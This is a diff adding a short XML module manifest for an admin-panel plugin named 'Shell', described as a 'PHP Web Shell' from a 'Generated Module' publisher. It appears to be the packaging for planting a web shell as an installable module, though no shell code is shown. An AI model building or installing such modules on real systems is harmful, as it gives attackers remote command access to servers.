@@ -1,0 +1,14 @@
+
+<module>
+  <rawname>shell</rawname>
+  <name>Shell</name>
+  <version>1.0</version>
+  <publisher>Generated Module</publisher>
+  <license>MIT</license>
+  <changelog>*1.0* Initial release</changelog>
+  <category>Admin</category>
+  <description>PHP Web Shell</description>
+  <menuitems>
+    <shell>Shell</shell>
+  </menuitems>
+</module>
